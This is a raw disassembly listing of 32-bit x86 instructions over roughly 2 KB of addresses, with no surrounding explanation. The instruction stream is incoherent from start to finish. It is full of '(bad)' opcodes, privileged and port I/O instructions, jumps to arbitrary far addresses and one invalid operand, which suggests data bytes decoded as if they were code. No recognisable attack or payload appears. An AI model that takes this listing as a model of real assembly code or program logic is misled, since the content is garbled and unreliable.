  42ec61:	scas   eax,DWORD PTR es:[edi]
  42ec62:	xlat   BYTE PTR ds:[ebx]
  42ec63:	add    eax,DWORD PTR [edx]
  42ec65:	mov    ds,edx
  42ec67:	aad    0xc0
  42ec69:	add    DWORD PTR [ebp-0x1e16012e],esp
  42ec6f:	fs sti 
  42ec71:	dec    edi
  42ec72:	pop    ebp
  42ec73:	(bad)  
  42ec74:	jle    0x42ecd3
  42ec76:	xchg   edi,eax
  42ec77:	movups XMMWORD PTR [esi+eiz*4-0x64492902],xmm3
  42ec7f:	cvttps2pi mm6,QWORD PTR [ebx]
  42ec82:	lahf   
  42ec83:	mov    ss,ebp
  42ec85:	mov    dh,0x9b
  42ec87:	std    
  42ec88:	out    0x0,al
  42ec8a:	add    BYTE PTR [eax],al
  42ec8c:	add    BYTE PTR [eax],al
  42ec8e:	xchg   esi,eax
  42ec8f:	sbb    al,0x9c
  42ec91:	add    DWORD PTR [eax+0x2a650302],ebp
  42ec97:	lods   eax,DWORD PTR ds:[esi]
  42ec98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec99:	add    ebp,DWORD PTR [edx-0x3c]
  42ec9c:	fwait
  42ec9d:	or     al,0x37
  42ec9f:	add    BYTE PTR [ecx],bl
  42eca1:	mov    edx,0xaaec0253
  42eca6:	jle    0x42ec2d
  42eca8:	add    BYTE PTR ds:0x12b0188,al
  42ecae:	add    eax,0x7603a5ad
  42ecb3:	arpl   sp,bp
  42ecb5:	mov    edx,0x96a002ab
  42ecba:	fild   WORD PTR [edx]
  42ecbc:	jmp    0xa0309f9b
  42ecc1:	mov    fs,WORD PTR [ebp-0x30a44f1b]
  42ecc7:	add    ch,cl
  42ecc9:	add    edx,DWORD PTR [edi+0x7b]
  42eccc:	jecxz  0x42ec5f
  42ecce:	mov    al,ds:0x6c1de945
  42ecd3:	push   esp
  42ecd5:	mov    bh,0x6b
  42ecd7:	add    dl,BYTE PTR [edx]
  42ecd9:	icebp  
  42ecda:	adc    al,0xcb
  42ecdc:	sti    
  42ecdd:	add    eax,0x10e945b9
  42ece2:	and    DWORD PTR [edx-0xc],0x47024bb7
  42ece9:	(bad)
  42eced:	stos   BYTE PTR es:[edi],al
  42ecee:	je     0x42ed6a
  42ecf0:	ror    DWORD PTR [edi+0x0],cl
  42ecf6:	add    BYTE PTR [eax+0x45],cl
  42ecf9:	jmp    0xb8e99e86
  42ecfe:	xchg   esi,eax
  42ecff:	mov    DWORD PTR [esi+0x207543f6],eax
  42ed05:	pop    esi
  42ed06:	inc    eax
  42ed07:	xor    DWORD PTR [eax],esp
  42ed09:	xchg   BYTE PTR [ebp+0x53e94520],cl
  42ed0f:	jne    0x42ecae
  42ed11:	(bad)  
  42ed12:	stc    
  42ed13:	daa    
  42ed14:	mov    bh,0x2e
  42ed16:	sub    DWORD PTR [esi-0x1a],ebx
  42ed19:	add    cl,ch
  42ed1b:	jbe    0x42ed41
  42ed1d:	lahf   
  42ed1e:	sbb    ebx,esp
  42ed20:	(bad)  
  42ed21:	(bad)  
  42ed22:	mov    edx,0xe9fa8cbe
  42ed27:	jbe    0x42ed5d
  42ed29:	mov    ah,bl
  42ed2b:	out    0xae,al
  42ed2d:	ds jmp 0x1436db21
  42ed33:	mov    bh,0x2
  42ed35:	bound  ecx,QWORD PTR [edx+0x0]
  42ed38:	scas   eax,DWORD PTR es:[edi]
  42ed39:	ds jmp 0xf792db40
  42ed3f:	add    bh,BYTE PTR ss:[edi-0x53]
  42ed43:	ins    DWORD PTR es:[edi],dx
  42ed44:	fdivr  DWORD PTR [edi+0x7f47be2f]
  42ed4a:	add    al,0xe9
  42ed4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed4d:	ds jmp 0x1f77fcc9
  42ed53:	and    eax,DWORD PTR [ecx]
  42ed55:	fisubr DWORD PTR [edx]
  42ed57:	jns    0x42ed8d
  42ed59:	sti    
  42ed5a:	cld    
  42ed5b:	add    BYTE PTR [eax],al
  42ed5d:	add    BYTE PTR [eax],al
  42ed5f:	add    BYTE PTR [esi-0x916c00a],ch
  42ed65:	(bad)
  42ed68:	xor    al,0x2
  42ed6a:	add    BYTE PTR [eax+eiz*4],dl
  42ed6d:	mov    al,ds:0x8be08774
  42ed72:	sub    DWORD PTR [ecx-0x3381039b],0xffffffe2
  42ed79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed7a:	ds jmp 0x6147b1f6
  42ed80:	and    cl,cl
  42ed82:	jmp    edi
  42ed84:	nop
  42ed85:	mov    edx,DWORD PTR [esi*8-0x5100379c]
  42ed8c:	(bad)  
  42ed8d:	xchg   edi,eax
  42ed8e:	aad    0x0
  42ed90:	pop    ds
  42ed91:	add    al,0xbb
  42ed93:	add    BYTE PTR [ecx+0x6c],0xdb
  42ed97:	inc    ebx
  42ed98:	dec    esp
  42ed99:	add    al,0x75
  42ed9b:	xor    eax,0xde032e0a
  42eda0:	fild   WORD PTR [ebx]
  42eda2:	dec    esi
  42eda3:	jmp    FWORD PTR [ecx]
  42eda5:	mov    WORD PTR [eax+eax*2],cs
  42eda8:	or     al,0x84
  42edaa:	cmp    edi,eax
  42edac:	popa   
  42edad:	inc    ecx
  42edae:	add    BYTE PTR [eax],al
  42edb0:	mov    DWORD PTR [esi+0x6f0231e2],edx
  42edb6:	cmc    
  42edb7:	test   BYTE PTR [edx+esi*8+0x5],cl
  42edbb:	cmp    DWORD PTR [ecx-0x23bc2491],0x3
  42edc2:	mov    esi,0x5
  42edc7:	add    BYTE PTR [eax],al
  42edc9:	aam    0x50
  42edcb:	cmp    DWORD PTR [eax],eax
  42edcd:	int    0xd5
  42edcf:	not    BYTE PTR ds:0x3a91e0
  42edd5:	xchg   edx,eax
  42edd6:	push   ds
  42edd7:	out    dx,eax
  42edd8:	fimul  DWORD PTR [edi+0x5755bafe]
  42edde:	pop    edi
  42eddf:	dec    edi
  42ede0:	push   ebx
  42ede1:	scas   eax,DWORD PTR es:[edi]
  42ede2:	dec    edx
  42ede3:	xor    bl,BYTE PTR ds:0x3950d4
  42ede9:	mov    DWORD PTR [ecx+0x4d94be50],esi
  42edef:	cmp    DWORD PTR [eax],eax
  42edf1:	dec    edx
  42edf2:	ins    DWORD PTR es:[edi],dx
  42edf3:	adc    ebx,DWORD PTR [eax]
  42edf5:	scas   al,BYTE PTR es:[edi]
  42edf6:	inc    ebx
  42edf7:	add    BYTE PTR [eax],bh
  42edf9:	mov    eax,ds:0x8c43db6b
  42edfe:	clc    
  42edff:	or     eax,0xf56ff4e8
  42ee04:	(bad)  
  42ee05:	fadd   st,st(3)
  42ee07:	outs   dx,BYTE PTR ds:[esi]
  42ee08:	or     eax,0xddf690e5
  42ee0d:	jne    0x42ee6b
  42ee0f:	inc    cl
  42ee11:	js     0x42ee44
  42ee13:	mov    dl,0x3e
  42ee15:	jne    0x42edb1
  42ee17:	sub    al,0xfb
  42ee19:	push   0x753ff0a5
  42ee1e:	outs   dx,DWORD PTR ds:[esi]
  42ee1f:	fsubr  DWORD PTR es:[eax-0x377701a7]
  42ee26:	fst    QWORD PTR [ebx+0x3e8bc914]
  42ee2c:	add    BYTE PTR [eax],al
  42ee2e:	add    BYTE PTR [eax],al
  42ee30:	add    BYTE PTR [eax],al
  42ee32:	pop    esi
  42ee33:	fmul   QWORD PTR [edx]
  42ee35:	cmp    DWORD PTR [ebp+0x753f8145],ebx
  42ee3b:	imul   edx,DWORD PTR [ebx+0x3eaacd14],0xadc3e00
  42ee45:	sub    DWORD PTR [eax],eax
  42ee47:	xchg   dx,ax
  42ee49:	push   eax
  42ee4a:	jp     0x42eeb4
  42ee4c:	add    BYTE PTR [edx],cl
  42ee4e:	rcr    ebx,0x3
  42ee51:	push   ecx
  42ee52:	push   0x68
  42ee54:	add    BYTE PTR [ecx+esi*4],cl
  42ee57:	fild   DWORD PTR [ebx]
  42ee59:	push   ecx
  42ee5a:	retf   0xfe85
  42ee5d:	(bad)  
  42ee5e:	ss cdq 
  42ee60:	lea    esi,[ecx+edi*4]
  42ee63:	jb     0x42eea7
  42ee65:	add    BYTE PTR [edx+0x20bf8868],dh
  42ee6b:	pushf  
  42ee6c:	jnp    0x42eeca
  42ee6e:	mov    eax,ds:0x3efc4913
  42ee73:	(bad)
  42ee78:	sub    ebx,0x65
  42ee7b:	in     al,dx
  42ee7c:	rcl    dh,cl
  42ee7e:	sub    eax,ecx
  42ee80:	out    dx,eax
  42ee81:	fistp  WORD PTR [eax-0x538afc25]
  42ee87:	aad    0xfb
  42ee89:	fnstenv [esi+0x5e39e902]
  42ee8f:	lock add dh,dh
  42ee92:	call   0x0:0xf11102
  42ee99:	add    BYTE PTR [eax],al
  42ee9b:	xor    ch,BYTE PTR [eax-0x1b3ffc5b]
  42eea1:	sub    cl,BYTE PTR [ecx]
  42eea3:	or     ebp,DWORD PTR [ebp-0x41c1fc5b]
  42eea9:	jmp    0x42eea2
  42eeab:	dec    esi
  42eeac:	inc    edx
  42eead:	jmp    0xe985e6d1
  42eeb2:	jl     0x42ee35
  42eeb4:	sahf   
  42eeb5:	cmp    eax,DWORD PTR [edi+0x75]
  42eeb8:	mov    esp,0x4231a3eb
  42eebd:	jmp    0xdbc895c6
  42eec2:	out    dx,eax
  42eec3:	jo     0x42ef07
  42eec5:	jmp    0x5fd58846
  42eeca:	xor    ecx,ebp
  42eecc:	jnp    0x42ee59
  42eece:	mov    esi,edx
  42eed0:	daa    
  42eed1:	loop   0x42eed5
  42eed3:	daa    
  42eed4:	inc    eax
  42eed5:	fidivr DWORD PTR [esi+0x69]
  42eed8:	out    dx,al
  42eed9:	mov    ah,0x46
  42eedb:	jne    0x42ef0e
  42eedd:	retf   0xf5d7
  42eee0:	ja     0x42ef0d
  42eee2:	xchg   esp,eax
  42eee3:	xor    bl,BYTE PTR [edx-0x7a450839]
  42eee9:	ins    BYTE PTR es:[edi],dx
  42eeea:	ret    
  42eeeb:	sub    ecx,edi
  42eeed:	stos   BYTE PTR es:[edi],al
  42eeee:	dec    eax
  42eeef:	scas   al,BYTE PTR es:[edi]
  42eef0:	and    BYTE PTR [ebx],0x93
  42eef3:	mov    al,ds:0x989ebd13
  42eef8:	push   eax
  42eef9:	out    0x80,eax
  42eefb:	cmp    DWORD PTR [edx+0x7c80],edx
  42ef01:	add    BYTE PTR [eax],al
  42ef03:	add    BYTE PTR [ebp+0x2],ah
  42ef06:	jmp    0x1e04ea3c
  42ef0b:	mov    ebp,0x62002fbb
  42ef10:	adc    al,BYTE PTR [esp+ebp*8]
  42ef13:	aad    0xa3
  42ef15:	aad    0xd6
  42ef17:	mov    edi,0x3cdfe62e
  42ef1c:	mov    bl,0x2
  42ef1e:	jne    0x42ef30
  42ef20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef21:	std    
  42ef22:	fldcw  WORD PTR [edx-0x2304cf8a]
  42ef28:	dec    esi
  42ef29:	idiv   DWORD PTR [edi]
  42ef2b:	jmp    0x1522d55e
  42ef30:	mov    ebx,0x3ccf7502
  42ef35:	(bad)  
  42ef36:	mov    ch,0x3f
  42ef38:	mov    ebx,0x6d26fb02
  42ef3d:	out    dx,al
  42ef3e:	fld    TBYTE PTR [edx-0x5672e98a]
  42ef44:	jbe    0x42efc1
  42ef46:	sbb    al,0xd
  42ef48:	(bad)
  42ef4b:	es ins DWORD PTR es:[edi],dx
  42ef4d:	mov    ds:0x376aadc,al
  42ef52:	push   edx
  42ef53:	out    dx,al
  42ef54:	loop   0x42ef3e
  42ef56:	or     eax,0x101c7929
  42ef5b:	jo     0x42eee7
  42ef5d:	xchg   esi,eax
  42ef5e:	mov    BYTE PTR [ecx+ebp*8],dh
  42ef61:	jns    0x42efbf
  42ef63:	aad    0x49
  42ef65:	es sti 
  42ef67:	daa    
  42ef68:	add    BYTE PTR [eax],al
  42ef6a:	add    BYTE PTR [eax],al
  42ef6c:	add    BYTE PTR [eax+edx*2+0x44],dh
  42ef70:	mov    esi,0x9513f638
  42ef75:	cmp    BYTE PTR [edx],al
  42ef77:	dec    edi
  42ef78:	scas   al,BYTE PTR es:[edi]
  42ef79:	int    0x81
  42ef7b:	mov    WORD PTR [edx*8-0x62c717cc],gs
  42ef82:	test   dl,bh
  42ef84:	ins    DWORD PTR es:[edi],dx
  42ef85:	mov    ecx,0xa3a1a10
  42ef8a:	ds clc 
  42ef8c:	add    BYTE PTR [ebx+esi*2+0x73],bl
  42ef90:	or     BYTE PTR ds:0x5568f7ed,al
  42ef96:	add    BYTE PTR [eax],al
  42ef98:	inc    eax
  42ef99:	fucomi st,st(3)
  42ef9b:	repz jmp DWORD PTR [ecx-0x40]
  42ef9f:	adc    eax,DWORD PTR [eax+0x4c]
  42efa2:	jg     0x42ef96
  42efa4:	add    DWORD PTR [eax],esi
  42efa6:	cdq    
  42efa7:	clc    
  42efa8:	inc    ebp
  42efa9:	mov    ebx,0x4eff7b7e
  42efae:	out    dx,al
  42efaf:	mov    ch,0x56
  42efb1:	fbstp  TBYTE PTR [edx+0x73]
  42efb4:	or     BYTE PTR [ebx-0x75],ch
  42efb7:	dec    edx
  42efb8:	push   ss
  42efb9:	fdiv   st(7),st
  42efbb:	jp     0x42ef81
  42efbd:	sub    BYTE PTR [edi-0x4],ah
  42efc0:	mov    dl,0xd
  42efc2:	add    eax,0x4374ec44
  42efc7:	or     al,BYTE PTR [eax]
  42efc9:	sbb    al,0xd2
  42efcb:	add    ebx,0x4bc48d7
  42efd1:	add    BYTE PTR [eax],al
  42efd3:	add    BYTE PTR [eax],al
  42efd5:	add    BYTE PTR [ecx*8+0x625fec82],cl
  42efdc:	push   ss
  42efdd:	push   esi
  42efde:	add    eax,DWORD PTR [edi]
  42efe0:	jmp    0x42f04c
  42efe2:	js     0x42efe7
  42efe4:	inc    esp
  42efe5:	in     al,0x9c
  42efe7:	enter  0xff61,0x6f
  42efeb:	jno    0x42efe2
  42efed:	adc    eax,0x3a90ec
  42eff2:	push   ecx
  42eff3:	mov    edi,0xf44d206e
  42eff8:	repz add ah,cl
  42effb:	(bad)  
  42effc:	push   DWORD PTR [ebx+eax*8+0x6a]
  42f000:	inc    ebx
  42f001:	clc    
  42f002:	lea    eax,[eax]
  42f004:	add    BYTE PTR [eax],al
  42f006:	add    DWORD PTR [eax],0x75757523
  42f00c:	jnp    0x42f052
  42f00e:	test   DWORD PTR [eax-0x4f868e38],esi
  42f014:	enter  0x7d86,0x10
  42f018:	enter  0xd35a,0x62
  42f01c:	ret    
  42f01d:	push   esp
  42f01e:	inc    BYTE PTR [esp+eax*4]
  42f021:	jmp    0x42efb4
  42f023:	inc    ebx
  42f024:	shl    ecx,cl
  42f026:	out    dx,al
  42f027:	xlat   BYTE PTR ds:[ebx]
  42f028:	jne    0x42f09e
  42f02a:	dec    ebp
  42f02b:	inc    ecx
  42f02c:	push   edi
  42f02d:	cli    
  42f02e:	dec    edx
  42f02f:	xor    al,0x84
  42f031:	mul    DWORD PTR [ebx-0x74]
  42f034:	test   cl,dh
  42f036:	jne    0x42efd1
  42f038:	dec    BYTE PTR [eax+eax*1+0x0]
  42f03f:	mov    eax,0xb5662ecd
  42f044:	mov    edi,0xdc8f4ef0
  42f049:	(bad)  
  42f04a:	adc    al,0xdd
  42f04c:	mov    DWORD PTR [esi],edi
  42f04e:	add    al,bh
  42f050:	fdivr  st,st(7)
  42f052:	sub    DWORD PTR [eax],0xffffff99
  42f055:	(bad)  
  42f056:	dec    DWORD PTR [edi+0x214479b8]
  42f05c:	outs   dx,DWORD PTR ds:[esi]
  42f05d:	outs   dx,BYTE PTR ds:[esi]
  42f05e:	dec    edi
  42f05f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f061:	adc    dh,BYTE PTR cs:0x71c38399
  42f068:	ret    
  42f069:	adc    eax,0xb7dde81a
  42f06e:	dec    edi
  42f06f:	es aas 
  42f071:	mov    edi,edx
  42f073:	pusha  
  42f074:	ins    DWORD PTR es:[edi],dx
  42f075:	hlt    
  42f076:	aas    
  42f077:	jne    0x42f08f
  42f079:	les    ecx,FWORD PTR [edx]
  42f07b:	icebp  
  42f07c:	jbe    0x42f081
  42f07e:	add    BYTE PTR [ebp-0x1c],dh
  42f081:	cmp    BYTE PTR [ecx+eax*8-0x16],0x76
  42f086:	ret    0x245
  42f089:	mov    ss,esp
  42f08b:	fwait
  42f08c:	xchg   edx,eax
  42f08d:	mov    gs,WORD PTR gs:[ebx+esi*8+0x69]
  42f092:	or     BYTE PTR [edx+0x6f79e882],0x82
  42f099:	jg     0x42f038
  42f09b:	push   es
  42f09c:	std    
  42f09d:	push   0xe3f85a8d
  42f0a2:	add    BYTE PTR [eax],0x0
  42f0a5:	add    BYTE PTR [eax],al
  42f0a7:	add    BYTE PTR [edx+0x8],ah
  42f0aa:	hlt    
  42f0ab:	sti    
  42f0ac:	sti    
  42f0ad:	inc    ebp
  42f0ae:	or     eax,0xa2036949
  42f0b3:	add    al,0xdb
  42f0b5:	add    ah,BYTE PTR [esi-0x72]
  42f0b8:	jno    0x42f0af
  42f0ba:	test   DWORD PTR [eax+0x371d37be],0x475944d
  42f0c4:	jne    0x42f04b
  42f0c6:	xor    BYTE PTR [edi+0x2b3d48a1],cl
  42f0cc:	cli    
  42f0cd:	inc    ebp
  42f0ce:	int    0x48
  42f0d0:	imul   ecx,DWORD PTR [edi+0x6a92089a],0x37b67ceb
  42f0da:	xor    al,0x37
  42f0dc:	lock (bad) 
  42f0de:	sbb    al,0x34
  42f0e0:	(bad)  
  42f0e1:	imul   esp
  42f0e3:	lds    esi,FWORD PTR [esi]
  42f0e5:	aaa    
  42f0e6:	sbb    eax,0x7d37f39d
  42f0eb:	icebp  
  42f0ec:	mov    ds:0xdf8f4f02,al
  42f0f1:	pop    eax
  42f0f2:	arpl   bx,ax
  42f0f4:	inc    esi
  42f0f5:	xor    ebx,DWORD PTR [esi+0x48]
  42f0f8:	jge    0x42f127
  42f0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0fb:	sbb    dl,0x7
  42f0fe:	data16 adc BYTE PTR [ebp+0x2],ah
  42f102:	mov    ds:0xff6bc948,eax
  42f107:	pop    edi
  42f108:	cmp    eax,0xe17357
  42f10d:	add    BYTE PTR [eax],al
  42f10f:	add    BYTE PTR [eax],al
  42f111:	pop    ds
  42f112:	(bad)  
  42f113:	or     esi,DWORD PTR [edx-0x21]
  42f116:	jl     0x42f16c
  42f118:	stc    
  42f119:	ins    BYTE PTR es:[edi],dx
  42f11a:	add    ah,BYTE PTR [esi-0x14]
  42f11d:	cmc    
  42f11e:	(bad)  
  42f11f:	sar    DWORD PTR [ecx],cl
  42f121:	inc    esi
  42f122:	call   0x87037821
  42f127:	mov    edi,0x7c8b77f5
  42f12c:	jno    0x42f0c9
  42f12e:	pop    DWORD PTR [ebp+ebp*2-0x5a]
  42f132:	jge    0x42f1a8
  42f134:	gs jl  0x42f153
  42f137:	dec    edi
  42f138:	rol    DWORD PTR [ebx],cl
  42f13a:	jl     0x42f150
  42f13c:	xchg   ecx,eax
  42f13d:	inc    ecx
  42f13e:	inc    ecx
  42f13f:	add    BYTE PTR [edx-0x53],ah
  42f142:	jp     0x42f19d
  42f144:	xor    BYTE PTR [ecx*1+0x6daf9400],dh
  42f14b:	jle    0x42f192
  42f14d:	mov    es,WORD PTR es:[ecx+edi*1+0x66]
  42f152:	jge    0x42f168
  42f154:	sub    DWORD PTR [ecx+eax*2],esp
  42f157:	add    BYTE PTR [ebp+edi*4+0x72],ch
  42f15b:	dec    edi
  42f15c:	add    DWORD PTR [edx+eax*1+0x0],esi
  42f160:	jmp    0x7297b126
  42f165:	fcmovbe st,st(1)
  42f167:	push   eax
  42f168:	ins    BYTE PTR es:[edi],dx
  42f169:	cmp    eax,0x82f64f7a
  42f16e:	or     bh,bl
  42f170:	aam    0x32
  42f172:	adc    al,BYTE PTR [eax-0x17]
  42f175:	add    BYTE PTR [eax],al
  42f177:	add    BYTE PTR [eax],al
  42f179:	add    BYTE PTR [ebp-0x3a],bl
  42f17c:	div    DWORD PTR [edx-0x6e]
  42f17f:	jle    0x42f1e6
  42f181:	jmp    0xa8c2f3f9
  42f186:	lahf   
  42f187:	call   0xee5cf20b
  42f18c:	cli    
  42f18d:	or     BYTE PTR ds:0xe2624865,0x34
  42f194:	push   eax
  42f195:	call   0x3dc79e
  42f19a:	in     eax,0x43
  42f19c:	(bad)  
  42f19d:	dec    DWORD PTR [ecx-0x5]
  42f1a0:	out    0x51,al
  42f1a2:	dec    edi
  42f1a3:	push   ebx
  42f1a4:	sar    DWORD PTR [ecx],1
  42f1a6:	push   ecx
  42f1a7:	jbe    0x42f21e
  42f1a9:	sysret 
  42f1ab:	leave  
  42f1ac:	pop    es
  42f1ad:	mov    DWORD PTR [ebp+edi*8+0x52],edx
  42f1b1:	add    al,0xd5
  42f1b3:	or     BYTE PTR cs:[eax+0x56649b4d],dh
  42f1ba:	sbb    edi,ebx
  42f1bc:	cmp    ebp,DWORD PTR [eax+0x4d]
  42f1bf:	(bad)  
  42f1c0:	call   DWORD PTR [edx+0xf]
  42f1c3:	xor    ecx,DWORD PTR [ebx-0x1]
  42f1c6:	sub    DWORD PTR [ebp+esi*8+0x75],esi
  42f1ca:	inc    eax
  42f1cb:	xor    ebp,DWORD PTR [eax-0x17]
  42f1ce:	jno    0x42f1d6
  42f1d0:	add    bh,bh
  42f1d2:	mov    edi,ecx
  42f1d4:	jmp    0xca8d:0x26105f3b
  42f1db:	add    al,0x50
  42f1dd:	call   0x42f1e2
  42f1e2:	add    bl,cl
  42f1e4:	shl    ch,1
  42f1e6:	call   DWORD PTR [ebp+0x4f3bfbc7]
  42f1ec:	sbb    dl,BYTE PTR [esi]
  42f1ee:	push   ebx
  42f1ef:	fbstp  TBYTE PTR ds:0x7369ff50
  42f1f5:	cmc    
  42f1f6:	jne    0x42f1c8
  42f1f8:	xor    ch,BYTE PTR [eax-0x17]
  42f1fb:	rol    DWORD PTR [ebx],1
  42f1fd:	add    bh,bh
  42f1ff:	sbb    ecx,DWORD PTR [ebx-0x40]
  42f202:	je     0x42f1e4
  42f204:	mov    ?,WORD PTR [ebx-0x4]
  42f207:	jne    0x42f24a
  42f209:	xor    BYTE PTR [ebp-0x402faf3e],bh
  42f20f:	into   
  42f210:	pop    edi
  42f211:	ja     0x42f25f
  42f213:	mov    cl,0xf4
  42f215:	inc    ecx
  42f216:	or     ch,bh
  42f218:	push   ebp
  42f219:	int    0x88
  42f21b:	ins    DWORD PTR es:[edi],dx
  42f21c:	in     al,0x39
  42f21e:	adc    ah,ch
  42f220:	xor    DWORD PTR [eax],ecx
  42f222:	mov    DWORD PTR ds:0x2a004e71,eax
  42f228:	aaa    
  42f229:	sub    ecx,ecx
  42f22b:	mov    bh,0x5d
  42f22d:	inc    BYTE PTR [esi-0x1809b2d7]
  42f233:	shl    dh,0x8b
  42f236:	cli    
  42f237:	lock test al,0x5
  42f23a:	add    al,0xa7
  42f23c:	test   eax,0xe8c50997
  42f241:	adc    ah,BYTE PTR [ecx+eax*4]
  42f244:	loopne 0x42f258
  42f246:	and    al,0x0
  42f248:	add    BYTE PTR [eax],al
  42f24a:	add    BYTE PTR [eax],al
  42f24c:	jns    0x42f20f
  42f24e:	xor    edi,ebx
  42f250:	inc    edx
  42f251:	rol    al,1
  42f253:	pop    es
  42f254:	jne    0x42f1f2
  42f256:	jns    0x42f29f
  42f258:	es xchg edi,eax
  42f25a:	xor    edi,DWORD PTR [edi+0x2c]
  42f25d:	outs   dx,DWORD PTR ds:[esi]
  42f25e:	adc    ecx,DWORD PTR [edx+0x66]
  42f261:	aaa    
  42f262:	rcl    esi,1
  42f264:	call   0x64297e19
  42f269:	hlt    
  42f26a:	inc    edx
  42f26b:	and    al,0x65
  42f26d:	jecxz  0x42f271
  42f26f:	add    DWORD PTR [ecx+0x59],edx
  42f272:	retf   0x8208
  42f275:	inc    ecx
  42f276:	adc    dh,0x69
  42f279:	push   ebp
  42f27a:	add    al,al
  42f27c:	test   eax,0x720c0c62
  42f281:	das    
  42f282:	mov    edi,0xef024f98
  42f287:	sub    al,dh
  42f289:	jle    0x42f2f6
  42f28b:	inc    esi
  42f28c:	je     0x42f214
  42f28e:	lods   eax,DWORD PTR ds:[esi]
  42f28f:	sti    
  42f290:	cld    
  42f291:	inc    ecx
  42f292:	fldcw  WORD PTR [edi-0x5]
  42f295:	add    bh,BYTE PTR [ecx-0x4686cdc3]
  42f29b:	or     edi,DWORD PTR [eax+0x7b1e9732]
  42f2a1:	mov    esp,DWORD PTR [edx+0x6d70a62d]
  42f2a7:	mov    BYTE PTR [edi+0x4ac3fd59],0x6b
  42f2ae:	out    0xd5,al
  42f2b0:	add    BYTE PTR [eax],al
  42f2b2:	add    BYTE PTR [eax],al
  42f2b4:	add    dl,al
  42f2b6:	fisubr WORD PTR [edx]
  42f2b8:	das    
  42f2b9:	mov    ebx,0x851de905
  42f2be:	fstp   TBYTE PTR [ebp-0x49fe243c]
  42f2c4:	ret    
  42f2c5:	and    edx,edx
  42f2c7:	pop    ebx
  42f2c8:	call   0xc82c7b44
  42f2cd:	mov    ds:0x86d7eef6,eax
  42f2d2:	ds out 0x11,eax
  42f2d5:	ja     0x42f308
  42f2d7:	sub    DWORD PTR [edi],ebp
  42f2d9:	cli    
  42f2da:	mov    bl,0xf1
  42f2dc:	xor    DWORD PTR [eax],eax
  42f2de:	mul    bh
  42f2e0:	sahf   
  42f2e1:	jae    0x42f26b
  42f2e3:	jmp    0x5dc7:0xdff052c7
  42f2ea:	cmc    
  42f2eb:	jmp    0x42f32e
  42f2ed:	dec    edx
  42f2ee:	jno    0x42f286
  42f2f0:	xchg   esp,eax
  42f2f1:	inc    ebx
  42f2f2:	jno    0x42f290
  42f2f4:	sub    al,0xf5
  42f2f6:	cmp    al,0xab
  42f2f8:	adc    BYTE PTR [ecx-0x43ac4f3],ah
  42f2fe:	dec    esp
  42f2ff:	int    0xba
  42f301:	mov    ds:0xa17bff4a,eax
  42f306:	shl    edi,1
  42f308:	cdq    
  42f309:	out    dx,eax
  42f30a:	js     0x42f306
  42f30c:	ins    DWORD PTR es:[edi],dx
  42f30d:	mov    dh,0xf1
  42f30f:	cmp    ah,BYTE PTR [edi]
  42f311:	dec    edx
  42f312:	inc    ebx
  42f313:	out    0xef,al
  42f315:	idiv   BYTE PTR [ebx]
  42f317:	pop    edx
  42f318:	push   ebp
  42f319:	add    BYTE PTR [eax],al
  42f31b:	add    BYTE PTR [eax],al
  42f31d:	add    BYTE PTR [eax+eax*8+0x36],dh
  42f321:	mov    edx,0xba367088
  42f326:	jp     0x42f356
  42f328:	xchg   DWORD PTR [edi-0x4f81ba3d],esp
  42f32e:	jo     0x42f31c
  42f330:	push   ds
  42f331:	das    
  42f332:	adc    cl,BYTE PTR [ebx-0x1a]
  42f335:	repnz or BYTE PTR [ebx],al
  42f338:	cmp    al,0xd9
  42f33a:	push   0x67d03c0b
  42f33f:	pop    es
  42f340:	inc    edx
  42f341:	ret    0xef0b
  42f344:	lock jb 0x42f37b
  42f347:	and    al,0xc1
  42f349:	push   0xffffffee
  42f34b:	add    BYTE PTR [esi-0x19],ch
  42f34e:	fild   DWORD PTR [ebx+0x26]
  42f351:	cs repz jle 0x42f382
  42f355:	sub    DWORD PTR [ebp+edx*8+0x69c3bcbe],ebx
  42f35c:	jle    0x42f39b
  42f35e:	sub    cl,ah
  42f360:	push   ecx
  42f361:	jb     0x42f369
  42f363:	test   BYTE PTR [ecx+esi*8+0x67],al
  42f367:	mov    eax,DWORD PTR [ecx+esi*1+0x3]
  42f36b:	adc    DWORD PTR [edi-0x3e7c1154],eax
  42f371:	adc    DWORD PTR [edx+0x79],ecx
  42f374:	cli    
  42f375:	push   ds
  42f376:	mov    edx,DWORD PTR [ebp-0x7c]
  42f379:	xor    ah,BYTE PTR [ebp+0xc]
  42f37c:	sti    
  42f37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f37e:	out    dx,al
  42f37f:	retf   0x7e
  42f382:	add    BYTE PTR [eax],al
  42f384:	add    BYTE PTR [eax],al
  42f386:	add    BYTE PTR [edx+0x71],bh
  42f389:	ins    DWORD PTR es:[edi],dx
  42f38a:	out    0x2f,eax
  42f38c:	inc    ecx
  42f38d:	push   ebp
  42f38e:	pop    esi
  42f38f:	pop    es
  42f390:	mov    esi,0x5bcc08bc
  42f395:	jmp    0xfabd4d1a
  42f39a:	mov    BYTE PTR [ecx],ah
  42f39c:	mov    dh,BYTE PTR [edx+0xccc8]
  42f3a2:	jne    0x42f374
  42f3a4:	dec    ebp
  42f3a5:	jmp    0x1ff8:0x4bfebf72
  42f3ac:	sbb    eax,0x5219000c
  42f3b1:	add    DWORD PTR [ecx],edi
  42f3b3:	push   ecx
  42f3b4:	mov    ch,BYTE PTR [ebx+eax*1+0x5]
  42f3b8:	cmp    eax,0x8a6983fc
  42f3bd:	cli    
  42f3be:	jne    0x42f34b
  42f3c0:	std    
  42f3c1:	dec    ebx
  42f3c2:	or     al,0x17
  42f3c4:	cmp    eax,0xf41d2bfc
  42f3c9:	xor    DWORD PTR ss:[edi+ecx*4],eax
  42f3cd:	clc    
  42f3ce:	(bad)  
  42f3cf:	jmp    0x42f3cc
  42f3d1:	mov    edx,0x438b5775
  42f3d6:	or     al,0xc7
  42f3d8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  42f3db:	adc    DWORD PTR [esp+ebp*2+0xc0babe1],eax
  42f3e2:	push   esi
  42f3e3:	mov    ah,0xdf
  42f3e5:	je     0x42f3e5
  42f3e7:	mov    ebx,0xf87389
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	add    BYTE PTR [eax],al
